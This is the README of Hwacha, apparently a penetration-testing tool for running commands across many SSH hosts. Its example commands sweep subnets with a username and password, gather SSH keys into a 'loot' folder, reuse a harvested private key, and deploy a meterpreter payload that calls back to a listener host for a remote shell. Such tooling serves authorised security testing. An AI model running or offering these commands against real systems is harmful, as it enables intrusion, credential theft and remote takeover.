# Hwacha
![alt tag](https://github.com/n00py/hwacha/blob/master/hwacha.png)

    $python hwacha.py 
        &&&&     &&         &&        &&
    &&&&&&&&&&&& &&         &&        &&      Created by Esteban Rodriguez   /~~\_
       &&&&&&    &&     &&&&&&&&&&    &&	  Web: https://www.n00py.io     /| '` *\
      &&    &&   &&&&&      &&        &&&&&        Twitter: @n00py1         \|  ___/
     &&      &&  &&&&&    &&  &&      &&&&&   _   _                     _
      &&    &&   &&      &&    &&     &&     | | | |                   | |
       &&&&&&    &&    &&&      &&&   &&     | |_| |__      ____ _  ___| |__   __ _
         &&      &&   &&          &&  &&     |  _  |\ \ /\ / / _` |/ __| '_ \ / _` |
    &&&&&&&&&&&&&&&                   &&     | | | | \ V  V / (_| | (__| | | | (_| |
                 &&                   &&     \_| |_/  \_/\_/ \__,_|\___|_| |_|\__,_| 
    To run commands, use -x [COMMAND]
    to run modules, use -m [MODULE]
    to specify module options, use -o [ARG=ARG ARG=ARG]
    to see all available modules, use -L
    Example usage:
    python hwacha.py -t 192.168.1.1/24 -u admin  -p password
    python hwacha.py -t 192.168.1.100-200 -u admin  -p password -m keys
    python hwacha.py -t 192.168.1.100-200 -u admin  -i loot/keys/192.168.1.101/id_rsa -x id
    python hwacha.py -t 192.168.1.123 -u admin  -p password -m meterpreter -o "LPORT=4444 LHOST=192.168.1.150 TYPE=64"
